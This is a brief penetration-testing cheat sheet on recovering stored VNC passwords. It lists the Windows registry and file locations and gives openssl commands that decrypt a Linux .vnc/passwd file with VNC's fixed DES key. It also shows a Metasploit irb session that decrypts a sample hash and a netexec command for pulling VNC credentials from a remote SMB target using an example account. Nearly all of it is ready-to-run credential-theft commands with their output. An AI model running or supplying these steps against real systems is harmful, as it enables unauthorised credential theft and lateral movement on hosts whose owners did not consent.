#password-cracking
# Windows

Location paths for VNC passwords:

```
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver
HKEY_CURRENT_USER\Software\TightVNC\Server
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4
C:\Program Files\UltraVNC\ultravnc.ini
```

Use Case: 

```
C:\Windows\system32>reg query HKLM\SOFTWARE\TightVNC\Server /s

HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server
--- SNIP ---
    Password    REG_BINARY    D7A514D8C556AADE
    ControlPassword    REG_BINARY    1B8167BC0099C7DC
--- SNIP ---
```

# Linux

If you obtain access to a linux system that is running a vnc service, search through the users .vnc directory. In the .vnc directory you may find a passwd file. To decrypt the password file, run the following command: 

```
cat .vnc/passwd | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
```

```
echo -n "vnc-hash" | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```

# Other ways to decrypt VNC Passwords

## Metasploit

```
$> msfconsole

msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
 => "\u0017Rk\u0006#NX\a"
>> require 'rex/proto/rfb'
 => true
>> Rex::Proto::RFB::Cipher.decrypt ["D7A514D8C556AADE"].pack('H*'), fixedkey
 => "Secure!\x00"
>> 
```

## Netexec

Note: Need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

- nxc smb 172.21.0.11 -u afsimmons -p password -M vnc

Source: 
- https://github.com/frizb/PasswordDecrypts